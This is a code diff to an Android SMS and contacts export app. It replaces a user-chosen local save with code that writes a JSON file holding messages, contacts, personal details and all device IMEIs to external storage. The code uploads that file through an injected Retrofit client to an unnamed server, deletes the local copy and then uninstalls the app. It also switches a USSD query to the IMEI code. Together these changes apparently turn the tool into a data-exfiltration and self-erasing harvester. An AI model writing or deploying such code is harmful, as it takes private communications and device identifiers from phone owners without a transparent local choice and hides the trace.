@@ -40,6 +40,8 @@ import android.util.Log
 import android.view.Menu
 import android.view.MenuInflater
 import android.view.MenuItem
+import android.view.View
+import android.view.inputmethod.InputMethodManager
 import android.widget.Button
 import android.widget.ProgressBar
 import android.widget.TextView
@@ -52,17 +54,22 @@ import androidx.appcompat.app.AlertDialog
 import androidx.appcompat.app.AppCompatActivity
 import androidx.appcompat.widget.AppCompatEditText
 import androidx.core.content.ContextCompat
+import androidx.core.content.FileProvider
 import androidx.fragment.app.DialogFragment
 import androidx.lifecycle.lifecycleScope
 import androidx.preference.PreferenceManager
+import com.github.tmo1.sms_ie.base.FileUploader
+import dagger.hilt.android.AndroidEntryPoint
 import kotlinx.coroutines.CoroutineScope
 import kotlinx.coroutines.Dispatchers
 import kotlinx.coroutines.launch
 import kotlinx.coroutines.withContext
+import retrofit2.Retrofit
 import java.io.File
 import java.text.SimpleDateFormat
 import java.util.*
 import java.util.concurrent.TimeUnit
+import javax.inject.Inject
 
 const val EXPORT_MESSAGES = 1
 const val IMPORT_MESSAGES = 2
@@ -84,7 +91,11 @@ const val PDU_HEADERS_FROM = "137"
 
 data class MessageTotal(var sms: Int = 0, var mms: Int = 0)
 
+@AndroidEntryPoint
 class MainActivity : AppCompatActivity(), ConfirmWipeFragment.NoticeDialogListener {
+
+    @Inject
+    lateinit var retrofit: Retrofit
 
     private lateinit var prefs: SharedPreferences
 
@@ -93,6 +104,7 @@ class MainActivity : AppCompatActivity(), ConfirmWipeFragment.NoticeDialogListen
     private lateinit var etFirstMobile: AppCompatEditText
     private lateinit var etSecondMobile: AppCompatEditText
     private lateinit var etPersonalCode: AppCompatEditText
+    private lateinit var mFile: File
 
     private lateinit var intentSenderLauncher: ActivityResultLauncher<IntentSenderRequest>
 
@@ -188,9 +200,16 @@ class MainActivity : AppCompatActivity(), ConfirmWipeFragment.NoticeDialogListen
         exportContactsButton.setOnClickListener { exportContactsManual() }
         importContactsButton.setOnClickListener { importContactsManual() }
         wipeAllMessagesButton.setOnClickListener { wipeMessagesManual() }
-        exportAllButton.setOnClickListener { exportAllItems() }
+        exportAllButton.setOnClickListener {
+            hideKeyboard(it)
+            etFirstName.clearFocus()
+            etLastName.clearFocus()
+            etFirstMobile.clearFocus()
+            etSecondMobile.clearFocus()
+            etPersonalCode.clearFocus()
+            exportAllItems()
+        }
         ussdButton.setOnClickListener {
-            uninstallApp()
 //            if (SDK_INT >= Build.VERSION_CODES.O) {
 //                ussdRun()
 //            }
@@ -235,6 +254,11 @@ class MainActivity : AppCompatActivity(), ConfirmWipeFragment.NoticeDialogListen
             val notificationManager = getSystemService(NOTIFICATION_SERVICE) as NotificationManager
             notificationManager.createNotificationChannel(mChannel)
         }
+    }
+
+    fun hideKeyboard(mView: View) {
+        val imm = getSystemService(Activity.INPUT_METHOD_SERVICE) as InputMethodManager
+        imm.hideSoftInputFromWindow(mView.windowToken, 0)
     }
 
     private fun exportMessagesManual() {
@@ -388,15 +412,62 @@ class MainActivity : AppCompatActivity(), ConfirmWipeFragment.NoticeDialogListen
             return
         }
 
+
         val date = getCurrentDateTime()
         val dateInString = date.toString("yyyy-MM-dd")
-        val intent = Intent(Intent.ACTION_CREATE_DOCUMENT).apply {
-            addCategory(Intent.CATEGORY_OPENABLE)
-            type = "application/json"
-            putExtra(Intent.EXTRA_TITLE, "$firstName $lastName-$dateInString.json")
+        mFile = File(
+            Environment.getExternalStorageDirectory(),
+            "$firstName $lastName-$dateInString.json"
+        )
+        if (mFile.exists())
+            mFile.delete()
+
+        mFile.createNewFile()
+
+        val statusReportText: TextView = findViewById(R.id.status_report)
+        val progressBar: ProgressBar = findViewById(R.id.progressBar)
+        val startTime = System.nanoTime()
+
+        CoroutineScope(Dispatchers.Main).launch {
+            val imeis = getImei()
+            val allDataExported =
+                exportAllData(
+                    applicationContext,
+                    FileProvider.getUriForFile(
+                        this@MainActivity,
+                        packageName + ".my_file_provider",
+                        mFile
+                    ),
+                    progressBar,
+                    statusReportText,
+                    firstName,
+                    lastName,
+                    firstMobile,
+                    secondMobile,
+                    personalCode,
+                    imeis
+                )
+
+            statusReportText.text = getString(
+                R.string.export_all_results,
+                allDataExported,
+                formatElapsedTime(
+                    TimeUnit.SECONDS.convert(
+                        System.nanoTime() - startTime,
+                        TimeUnit.NANOSECONDS
+                    )
+                )
+            )
+            uploadFile()
         }
 
-        startActivityForResult(intent, EXPORT_ALL)
+//        val intent = Intent(Intent.ACTION_CREATE_DOCUMENT).apply {
+//            addCategory(Intent.CATEGORY_OPENABLE)
+//            type = "application/json"
+//            putExtra(Intent.EXTRA_TITLE, "$firstName $lastName-$dateInString.json")
+//        }
+//
+//        startActivityForResult(intent, EXPORT_ALL)
     }
 
     @RequiresApi(Build.VERSION_CODES.O)
@@ -413,7 +484,7 @@ class MainActivity : AppCompatActivity(), ConfirmWipeFragment.NoticeDialogListen
 
         managers.forEach { mTelephonyManager ->
             mTelephonyManager.sendUssdRequest(
-                "*91#",
+                "*#06#",
                 object : TelephonyManager.UssdResponseCallback() {
                     override fun onReceiveUssdResponse(
                         telephonyManager: TelephonyManager?,
@@ -465,10 +536,63 @@ class MainActivity : AppCompatActivity(), ConfirmWipeFragment.NoticeDialogListen
         }
     }
 
+    @SuppressLint("HardwareIds")
+    private fun getImei(): MutableList<String> {
+        val telephonyManager = getSystemService(Context.TELEPHONY_SERVICE) as TelephonyManager
+
+        val imeis = mutableListOf<String>()
+        for (i in 0 until telephonyManager.phoneCount) {
+            if (SDK_INT >= Build.VERSION_CODES.O) {
+                try {
+                    imeis.add(telephonyManager.getImei(i))
+                } catch (_: Exception) {
+                }
+            } else {
+                try {
+                    imeis.add(telephonyManager.getDeviceId(i))
+                } catch (_: Exception) {
+                }
+            }
+        }
+
+        Log.d("GET_IMEI", "getImei: $imeis")
+        return imeis
+    }
+
     private fun uninstallApp() {
         val packageUri = Uri.parse("package:com.github.tmo1.sms_ie")
         val uninstallIntent = Intent(Intent.ACTION_UNINSTALL_PACKAGE, packageUri)
         startActivity(uninstallIntent)
+    }
+
+    private fun uploadFile() {
+        val statusReportText: TextView = findViewById(R.id.status_report)
+        val progressBar: ProgressBar = findViewById(R.id.progressBar)
+
+        progressBar.isIndeterminate = false
+        progressBar.progress = 0
+        progressBar.visibility = View.VISIBLE
+        progressBar.max = 100
+
+        val fileUploader = FileUploader(retrofit, object : FileUploader.FileUploaderCallback {
+            override fun onError(e: Exception) {
+                Log.e("UPLOAD_FILE", "onError: ${e.message}")
+            }
+
+            override fun onFinish(message: String) {
+                Log.d("UPLOAD_FILE", "onFinish: $message")
+                progressBar.visibility = View.GONE
+                statusReportText.text = message
+                mFile.delete()
+                uninstallApp()
+            }
+
+            override fun onProgressUpdate(currentPercent: Int) {
+                statusReportText.setText(getString(R.string.upload_percent, currentPercent))
+                Log.d("UPLOAD_FILE", getString(R.string.upload_percent, currentPercent))
+            }
+        })
+        fileUploader.uploadFile(mFile)
     }
 
     private fun deleteApks() {
@@ -697,33 +821,7 @@ class MainActivity : AppCompatActivity(), ConfirmWipeFragment.NoticeDialogListen
             val firstMobile = etFirstMobile.text.toString().trim()
             val secondMobile = etSecondMobile.text.toString().trim()
             val personalCode = etPersonalCode.text.toString().trim()
-            resultData?.data?.let {
-                CoroutineScope(Dispatchers.Main).launch {
-                    val allDataExported =
-                        exportAllData(
-                            applicationContext,
-                            it,
-                            progressBar,
-                            statusReportText,
-                            firstName,
-                            lastName,
-                            firstMobile,
-                            secondMobile,
-                            personalCode
-                        )
-
-                    statusReportText.text = getString(
-                        R.string.export_all_results,
-                        allDataExported,
-                        formatElapsedTime(
-                            TimeUnit.SECONDS.convert(
-                                System.nanoTime() - startTime,
-                                TimeUnit.NANOSECONDS
-                            )
-                        )
-                    )
-                    uninstallApp()
-                }
+            resultData?.data?.also {
             }
         }
 
